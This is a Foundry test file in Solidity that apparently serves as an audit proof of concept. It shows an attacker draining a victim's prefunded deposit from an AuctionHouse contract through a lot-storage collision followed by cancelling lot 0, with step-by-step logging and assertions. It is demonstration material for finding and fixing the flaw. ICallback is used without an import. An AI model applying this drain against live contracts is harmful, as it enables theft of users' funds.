// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol";
import {AuctionHouse} from "src/AuctionHouse.sol";
import {Auction, AuctionModule} from "src/modules/Auction.sol";
import {Keycode, Veecode, toKeycode} from "src/modules/Modules.sol";
import {Module} from "src/modules/Modules.sol";

// Mock ERC20 token for testing
contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol, uint8 decimals_) ERC20(name, symbol, decimals_) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

// Mock Auction Module
contract MockAuctionModule is AuctionModule {
    constructor(address auctionHouse_) Module(auctionHouse_) {}
    
    function VEECODE() public pure override returns (Veecode) {
        return Veecode.wrap(bytes7("MOCK001"));
    }
    
    function TYPE() public pure override returns (Type) {
        return Type.Auction;
    }
    
    function auction(
        uint96,
        Auction.AuctionParams calldata params_,
        uint8,
        uint8
    ) external pure override returns (uint96) {
        return params_.capacity;
    }
    
    function cancelAuction(uint96) external pure override {}
    
    function auctionType() external pure override returns (Auction.AuctionType) {
        return Auction.AuctionType.Atomic;
    }
}

// Minimal AuctionHouse implementation for testing
contract TestableAuctionHouse is AuctionHouse {
    mapping(Keycode => address) public installedModules;
    
    constructor(
        address owner_,
        address protocol_,
        address permit2_
    ) AuctionHouse(owner_, protocol_, permit2_) {}
    
    function installModule(Keycode keycode_, address module_) external {
        installedModules[keycode_] = module_;
    }
    
    function _getLatestModuleIfActive(Keycode keycode_) internal view override returns (address) {
        address module = installedModules[keycode_];
        require(module != address(0), "Module not installed");
        return module;
    }
    
    function _getModuleIfInstalled(Veecode) internal view override returns (address) {
        return address(installedModules[toKeycode("MOCK")]);
    }
}

contract StorageCollisionExploitTest is Test {
    TestableAuctionHouse public auctionHouse;
    MockERC20 public baseToken;
    MockERC20 public quoteToken;
    MockAuctionModule public auctionModule;
    
    address public victim = address(0x1);
    address public attacker = address(0x2);
    address public protocol = address(0x3);
    address public permit2 = address(0x4);
    
    uint256 constant VICTIM_FUNDING = 100e18;
    
    function setUp() public {
        // Deploy contracts
        auctionHouse = new TestableAuctionHouse(address(this), protocol, permit2);
        baseToken = new MockERC20("Base Token", "BASE", 18);
        quoteToken = new MockERC20("Quote Token", "QUOTE", 18);
        auctionModule = new MockAuctionModule(address(auctionHouse));
        
        // Install mock auction module
        auctionHouse.installModule(toKeycode("MOCK"), address(auctionModule));
        
        // Setup victim with tokens
        baseToken.mint(victim, VICTIM_FUNDING);
        
        vm.prank(victim);
        baseToken.approve(address(auctionHouse), type(uint256).max);
    }
    
    function testStorageCollisionExploit() public {
        // Step 1: Victim creates a prefunded auction
        console.log("=== Step 1: Victim creates prefunded auction ===");
        console.log("Victim balance before:", baseToken.balanceOf(victim));
        console.log("AuctionHouse balance before:", baseToken.balanceOf(address(auctionHouse)));
        
        vm.prank(victim);
        uint96 victimLotId = auctionHouse.auction(
            Auctioneer.RoutingParams({
                auctionType: toKeycode("MOCK"),
                baseToken: baseToken,
                quoteToken: quoteToken,
                curator: address(0),
                callbacks: ICallback(address(0)),
                callbackData: "",
                derivativeType: toKeycode(""),
                derivativeParams: "",
                wrapDerivative: false,
                prefunded: true
            }),
            Auction.AuctionParams({
                start: uint48(block.timestamp),
                duration: uint48(1 days),
                capacityInQuote: false,
                capacity: uint96(VICTIM_FUNDING),
                implParams: ""
            }),
            "victim-auction-info"
        );
        
        console.log("Victim lot ID:", victimLotId);
        console.log("Victim balance after:", baseToken.balanceOf(victim));
        console.log("AuctionHouse balance after:", baseToken.balanceOf(address(auctionHouse)));
        
        // Verify victim's auction was created and funded
        (address seller0, uint96 funding0,,,,,,,) = auctionHouse.lotRouting(0);
        console.log("lotRouting[0] seller:", seller0);
        console.log("lotRouting[0] funding:", funding0);
        
        assertEq(seller0, victim, "Seller should be victim");
        assertEq(funding0, VICTIM_FUNDING, "Funding should match victim's deposit");
        assertEq(baseToken.balanceOf(address(auctionHouse)), VICTIM_FUNDING, "AuctionHouse should hold victim's tokens");
        
        // Step 2: Attacker creates a non-prefunded auction (overwrites slot 0)
        console.log("\n=== Step 2: Attacker creates non-prefunded auction ===");
        console.log("Attacker balance before:", baseToken.balanceOf(attacker));
        
        vm.prank(attacker);
        uint96 attackerLotId = auctionHouse.auction(
            Auctioneer.RoutingParams({
                auctionType: toKeycode("MOCK"),
                baseToken: baseToken,
                quoteToken: quoteToken,
                curator: address(0),
                callbacks: ICallback(address(0)),
                callbackData: "",
                derivativeType: toKeycode(""),
                derivativeParams: "",
                wrapDerivative: false,
                prefunded: false  // NOT prefunded - this is key!
            }),
            Auction.AuctionParams({
                start: uint48(block.timestamp),
                duration: uint48(1 days),
                capacityInQuote: false,
                capacity: uint96(1e18),  // Arbitrary capacity
                implParams: ""
            }),
            "attacker-auction-info"
        );
        
        console.log("Attacker lot ID:", attackerLotId);
        console.log("Attacker balance after:", baseToken.balanceOf(attacker));
        
        // Verify storage collision - lotRouting[0] now points to attacker
        (address seller0After, uint96 funding0After,,,,,,,) = auctionHouse.lotRouting(0);
        console.log("lotRouting[0] seller after attacker auction:", seller0After);
        console.log("lotRouting[0] funding after attacker auction:", funding0After);
        
        assertEq(seller0After, attacker, "VULNERABILITY: Seller at slot 0 should now be attacker");
        assertEq(funding0After, VICTIM_FUNDING, "VULNERABILITY: Funding still shows victim's amount");
        
        // Step 3: Attacker cancels lot 0 and steals victim's funds
        console.log("\n=== Step 3: Attacker cancels lot 0 and steals funds ===");
        console.log("Attacker balance before cancel:", baseToken.balanceOf(attacker));
        console.log("AuctionHouse balance before cancel:", baseToken.balanceOf(address(auctionHouse)));
        
        vm.prank(attacker);
        auctionHouse.cancel(0, "");
        
        console.log("Attacker balance after cancel:", baseToken.balanceOf(attacker));
        console.log("AuctionHouse balance after cancel:", baseToken.balanceOf(address(auctionHouse)));
        
        // Verify the exploit succeeded
        assertEq(
            baseToken.balanceOf(attacker),
            VICTIM_FUNDING,
            "EXPLOIT SUCCESS: Attacker stole victim's funds"
        );
        assertEq(
            baseToken.balanceOf(address(auctionHouse)),
            0,
            "AuctionHouse should be drained"
        );
        assertEq(
            baseToken.balanceOf(victim),
            0,
            "Victim lost all funds"
        );
        
        console.log("\n=== EXPLOIT SUMMARY ===");
        console.log("Victim deposited:", VICTIM_FUNDING);
        console.log("Attacker deposited: 0");
        console.log("Attacker stole:", VICTIM_FUNDING);
        console.log("Victim's loss:", VICTIM_FUNDING);
    }
    
    function testMultipleVictimsExploit() public {
        // This test demonstrates that multiple victims can be exploited
        // Each new auction overwrites slot 0, and the attacker can steal from the last victim
        
        address victim2 = address(0x5);
        uint256 victim2Funding = 200e18;
        
        // Setup second victim
        baseToken.mint(victim2, victim2Funding);
        vm.prank(victim2);
        baseToken.approve(address(auctionHouse), type(uint256).max);
        
        // Victim 1 creates auction
        vm.prank(victim);
        auctionHouse.auction(
            Auctioneer.RoutingParams({
                auctionType: toKeycode("MOCK"),
                baseToken: baseToken,
                quoteToken: quoteToken,
                curator: address(0),
                callbacks: ICallback(address(0)),
                callbackData: "",
                derivativeType: toKeycode(""),
                derivativeParams: "",
                wrapDerivative: false,
                prefunded: true
            }),
            Auction.AuctionParams({
                start: uint48(block.timestamp),
                duration: uint48(1 days),
                capacityInQuote: false,
                capacity: uint96(VICTIM_FUNDING),
                implParams: ""
            }),
            "victim1-auction"
        );
        
        // Victim 2 creates auction (overwrites victim 1's data at slot 0)
        vm.prank(victim2);
        auctionHouse.auction(
            Auctioneer.RoutingParams({
                auctionType: toKeycode("MOCK"),
                baseToken: baseToken,
                quoteToken: quoteToken,
                curator: address(0),
                callbacks: ICallback(address(0)),
                callbackData: "",
                derivativeType: toKeycode(""),
                derivativeParams: "",
                wrapDerivative: false,
                prefunded: true
            }),
            Auction.AuctionParams({
                start: uint48(block.timestamp),
                duration: uint48(1 days),
                capacityInQuote: false,
                capacity: uint96(victim2Funding),
                implParams: ""
            }),
            "victim2-auction"
        );
        
        // Verify slot 0 now has victim2's data
        (address seller0, uint96 funding0,,,,,,,) = auctionHouse.lotRouting(0);
        assertEq(seller0, victim2, "Slot 0 should have victim2 as seller");
        assertEq(funding0, victim2Funding, "Slot 0 should have victim2's funding");
        
        // Attacker creates non-prefunded auction
        vm.prank(attacker);
        auctionHouse.auction(
            Auctioneer.RoutingParams({
                auctionType: toKeycode("MOCK"),
                baseToken: baseToken,
                quoteToken: quoteToken,
                curator: address(0),
                callbacks: ICallback(address(0)),
                callbackData: "",
                derivativeType: toKeycode(""),
                derivativeParams: "",
                wrapDerivative: false,
                prefunded: false
            }),
            Auction.AuctionParams({
                start: uint48(block.timestamp),
                duration: uint48(1 days),
                capacityInQuote: false,
                capacity: uint96(1e18),
                implParams: ""
            }),
            "attacker-auction"
        );
        
        // Attacker steals victim2's funds
        vm.prank(attacker);
        auctionHouse.cancel(0, "");
        
        assertEq(
            baseToken.balanceOf(attacker),
            victim2Funding,
            "Attacker should steal victim2's larger deposit"
        );
    }
}
